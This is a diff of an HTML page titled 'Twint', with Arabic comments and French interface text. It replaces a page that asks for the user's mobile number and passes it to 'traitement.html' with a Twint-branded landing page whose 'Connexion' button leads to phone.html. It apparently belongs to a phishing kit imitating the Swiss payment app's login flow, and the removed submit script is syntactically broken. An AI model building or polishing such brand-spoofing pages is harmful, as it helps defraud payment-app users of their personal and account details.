@@ -6,61 +6,24 @@
     <title>Twint</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { display: flex; justify-content: center; align-items: center; height: 100vh; background: #fff; transition: opacity 0.5s ease-in-out; }
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; background: black; color: white; flex-direction: column; text-align: center; }
         
-        /* شاشة البداية */
-        #splash-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; display: flex; justify-content: center; align-items: center; z-index: 1000; transition: opacity 0.5s ease-in-out; }
-        #splash-screen img { width: 150px; }
+        /* الشعار */
+        #logo { width: 150px; margin-bottom: 20px; }
 
-        /* الصفحة الرئيسية */
-        #main-content { display: none; text-align: center; width: 100%; max-width: 400px; }
-        #main-content img { width: 100px; margin-bottom: 20px; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
-        button { width: 100%; padding: 10px; background: #ccc; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
-        button:disabled { background: #eee; cursor: not-allowed; }
+        /* زر الاتصال */
+        button { padding: 12px 20px; background: white; color: black; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
+        button:hover { background: #ddd; }
     </style>
 </head>
 <body>
 
-    <!-- شاشة البداية -->
-    <div id="splash-screen">
-        <img src="images (2).png" alt="Twint Logo">
-    </div>
-
-    <!-- الصفحة الرئيسية -->
-    <div id="main-content">
-        <img src="photo_2025-03-05_02-45-20.jpg" alt="Phone">
-        <h2>Veuillez saisir votre numéro</h2>
-        <p>Veuillez saisir votre numéro de portable.</p>
-        <input type="tel" id="phone-number" placeholder="p. ex. 079 555 12 34" oninput="validateInput()">
-        <button id="submit-btn" disabled onclick="submitForm()">Suivant</button>
-        <button onclick="history.back()">Retour</button>
-    </div>
+    <img id="logo" src="images (2).png" alt="Twint Logo">
+    <button onclick="goToPhonePage()">Connexion</button>
 
     <script>
-        // التأكد من تحميل الصفحة بالكامل قبل تنفيذ الإخفاء
-        window.onload = function() {
-            setTimeout(() => {
-                document.getElementById('splash-screen').style.opacity = '0';
-                setTimeout(() => {
-                    document.getElementById('splash-screen').style.display = 'none';
-                    document.getElementById('main-content').style.display = 'block';
-                }, 500); // وقت إضافي لتأثير التلاشي
-            }, 2000);
-        };
-
-        // التحقق من صحة الإدخال
-        function validateInput() {
-            let phoneInput = document.getElementById("phone-number").value;
-            let button = document.getElementById("submit-btn");
-            let phoneRegex = /^\+?\d{7,15}$/; // رقم هاتف صالح
-            button.disabled = !phoneRegex.test(phoneInput);
-        }
-
-        // توجيه المستخدم إلى صفحة المعالجة
-        function submitForm() {
-            let phoneInput = document.getElementById("phone-number").value;
-            window.location.href = traitement.html?phone=${encodeURIComponent(phoneInput)};
+        function goToPhonePage() {
+            window.location.href = "phone.html"; // توجيه إلى صفحة إدخال رقم الهاتف
         }
     </script>
 
